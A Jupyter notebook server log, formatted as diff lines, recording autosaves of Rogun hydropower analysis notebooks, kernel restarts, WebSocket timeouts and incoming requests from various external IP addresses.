+[I 08:14:28.783 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:14:36.169 NotebookApp] Kernel restarted: 659633e3-4083-4a34-9427-48700676a17b
+[I 08:14:36.934 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+Xlib:  extension "XInputExtension" missing on display ":1.0".
+[I 08:14:38.999 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:16:38.607 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:18:38.578 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:20:39.568 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:22:16.338 NotebookApp] 302 GET / (91.243.80.187) 0.53ms
+[I 08:22:16.796 NotebookApp] 302 GET /tree? (91.243.80.187) 0.99ms
+[I 08:22:39.704 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 08:42:29.566 NotebookApp] 302 GET / (181.121.12.92) 0.52ms
+[I 09:03:02.320 NotebookApp] 302 GET / (186.93.9.136) 0.64ms
+[W 09:14:12.545 NotebookApp] 404 GET /manager/html (204.44.65.126) 2.16ms referer=None
+[I 10:18:37.762 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 10:18:39.145 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 10:18:45.494 NotebookApp] Kernel restarted: 659633e3-4083-4a34-9427-48700676a17b
+[I 10:18:46.381 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+Xlib:  extension "XInputExtension" missing on display ":1.0".
+[I 10:20:38.401 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 10:22:39.058 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 10:24:38.449 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:12:34.294 NotebookApp] 302 GET / (101.127.227.199) 0.53ms
+[I 11:18:07.812 NotebookApp] 302 GET / (35.199.186.54) 0.44ms
+[I 11:18:07.957 NotebookApp] 302 GET /tree? (35.199.186.54) 0.76ms
+[I 11:26:41.178 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:28:38.545 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:30:39.211 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:31:27.160 NotebookApp] 302 GET / (122.102.24.202) 0.47ms
+[I 11:32:38.615 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:34:38.452 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:36:39.534 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:38:39.409 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:40:09.172 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:40:38.710 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:41:47.592 NotebookApp] 302 GET / (196.44.183.33) 0.47ms
+[I 11:42:40.474 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:44:38.630 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:46:33.208 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:46:33.938 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 11:46:39.240 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:46:50.381 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:47:31.173 NotebookApp] Kernel restarted: 659633e3-4083-4a34-9427-48700676a17b
+[I 11:47:31.879 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+Xlib:  extension "XInputExtension" missing on display ":1.0".
+[I 11:48:39.403 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:48:50.772 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:50:39.189 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:50:53.245 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:52:39.112 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 11:52:51.023 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 11:54:38.392 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:02:38.546 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:04:01.575 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:04:38.410 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:06:39.179 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:06:50.709 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:07:55.948 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:10:52.988 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:12:53.063 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:13:44.629 NotebookApp] Kernel restarted: 659633e3-4083-4a34-9427-48700676a17b
+[I 12:13:45.418 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+Xlib:  extension "XInputExtension" missing on display ":1.0".
+[I 12:13:58.662 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 12:13:59.942 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 12:14:39.127 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:14:53.132 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:16:53.163 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:18:38.693 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:18:53.115 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:20:02.098 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:20:38.395 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:21:03.343 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:21:34.264 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:22:38.450 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:22:52.985 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 12:24:38.457 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:26:09.984 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:26:38.476 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:28:38.530 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:30:35.863 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:32:32.431 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:32:38.422 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:33:37.942 NotebookApp] 302 GET / (94.200.114.174) 0.60ms
+[I 12:34:38.281 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:35:50.024 NotebookApp] 302 GET / (58.96.241.158) 0.61ms
+[I 12:38:38.402 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:42:38.508 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:44:10.121 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:44:38.354 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:46:38.828 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:48:33.236 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:48:38.707 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:49:02.381 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:50:38.526 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:52:38.455 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:54:38.971 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 12:58:36.140 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:00:38.847 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:00:43.482 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:01:15.866 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:02:38.434 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:04:38.405 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:05:38.022 NotebookApp] Kernel restarted: b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:05:39.123 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 13:06:39.182 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:06:44.908 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:08:39.113 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:08:55.036 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:10:39.065 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:12:39.538 NotebookApp] Saving file at /data_analysis/RogunHPP.PowerhouseDataAnalysis.ipynb
+[I 13:13:27.536 NotebookApp] 302 GET / (170.238.63.177) 0.53ms
+[I 13:14:55.807 NotebookApp] Saving file at /data_analysis/RogunHPP.SurfaceDXFtoNodesCSV.ipynb
+[I 13:43:04.572 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 14:21:22.237 NotebookApp] 302 GET / (177.74.135.11) 0.50ms
+[W 14:26:34.573 NotebookApp] WebSocket ping timeout after 119954 ms.
+[W 14:26:40.654 NotebookApp] WebSocket ping timeout after 119873 ms.
+[W 14:26:42.713 NotebookApp] WebSocket ping timeout after 119946 ms.
+[W 14:26:45.420 NotebookApp] WebSocket ping timeout after 119938 ms.
+[W 14:26:51.691 NotebookApp] WebSocket ping timeout after 119942 ms.
+[W 14:26:53.699 NotebookApp] WebSocket ping timeout after 119963 ms.
+[W 14:27:03.667 NotebookApp] WebSocket ping timeout after 119968 ms.
+[I 15:05:25.632 NotebookApp] 302 GET / (103.226.92.222) 0.80ms
+[I 15:45:56.273 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 15:45:58.239 NotebookApp] Adapting to protocol v5.1 for kernel 00391099-ca73-4d6f-8d34-b9ba0546ef22
+[I 15:46:00.271 NotebookApp] Adapting to protocol v5.1 for kernel 659633e3-4083-4a34-9427-48700676a17b
+[I 15:46:07.247 NotebookApp] Adapting to protocol v5.1 for kernel 7d707769-7fa0-4016-bca7-ebbd158e52ed
+[I 15:46:09.257 NotebookApp] Adapting to protocol v5.1 for kernel 54685d48-a53d-49b7-8843-cccd61a96866
+[I 15:46:18.248 NotebookApp] Adapting to protocol v5.1 for kernel 992e6179-0a4d-43b1-96b8-1eb0c98e2477
+[I 15:54:40.254 NotebookApp] Adapting to protocol v5.1 for kernel b7373cfa-4c01-487f-b4cd-47e63f6e5250
+[I 16:17:43.120 NotebookApp] 302 GET / (213.165.178.45) 0.49ms
+[I 17:27:00.404 NotebookApp] 302 GET / (139.162.111.98) 0.62ms
+[I 17:37:38.493 NotebookApp] 302 GET / (179.228.59.93) 0.50ms
+[I 18:05:23.432 NotebookApp] 302 GET / (141.105.64.218) 0.53ms
+[I 18:05:23.479 NotebookApp] 302 GET /tree? (141.105.64.218) 0.86ms
+[I 18:15:54.366 NotebookApp] 302 GET / (5.63.164.170) 0.50ms
+[I 18:47:29.771 NotebookApp] 302 GET / (164.52.24.170) 0.47ms
